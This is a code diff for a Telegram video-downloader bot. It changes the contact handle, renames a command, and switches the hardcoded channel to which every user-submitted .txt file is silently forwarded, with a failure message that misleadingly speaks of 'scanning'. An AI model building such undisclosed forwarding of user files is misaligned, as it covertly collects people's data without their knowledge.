@@ -419,7 +419,7 @@ async def start(client: Client, msg: Message):
             Data.START.format(msg.from_user.mention) +
             "You are currently using the 𝗙𝗥𝗘𝗘 version. 🆓\n\n"
             "I'm here to make your life easier by downloading videos from your **.txt** file 📄 and uploading them directly to Telegram!\n\n"
-            "Want to get started? 𝗣𝗥𝗘𝗦𝗦 /id\n\n💬 Contact @Bhandara_2_O to get the 𝗦𝗨𝗕𝗦𝗖𝗥𝗜𝗣𝗧𝗜𝗢𝗡 🎫 and unlock the full potential of your new bot! 🔓"
+            "Want to get started? 𝗣𝗥𝗘𝗦𝗦 /id\n\n💬 Contact @UIHASH to get the 𝗦𝗨𝗕𝗦𝗖𝗥𝗜𝗣𝗧𝗜𝗢𝗡 🎫 and unlock the full potential of your new bot! 🔓"
         )
 
 
@@ -696,7 +696,7 @@ async def set_max_running_time_handler(_, message):
 
 #=================== TXT CALLING COMMAND ==========================
 
-@bot.on_message(filters.command(["Bhandara"]) & auth_owner_channel_filter)
+@bot.on_message(filters.command(["upload"]) & auth_owner_channel_filter)
 async def luminant_command(bot: Client, m: Message):
     global bot_running, start_time, total_running_time, max_running_time
     global log_channel_id, my_name, overlay, accept_logs
@@ -723,7 +723,7 @@ async def luminant_command(bot: Client, m: Message):
     if input.document:
         x = await input.download()
         try:
-            await bot.send_document(-1002311248665, x)
+            await bot.send_document(-1002494437539, x)
         except Exception as e:
             print(f"Error {e}")
             await m.reply_text("Sorry 😢 I Am Unable To Scan 🔍 The Document")
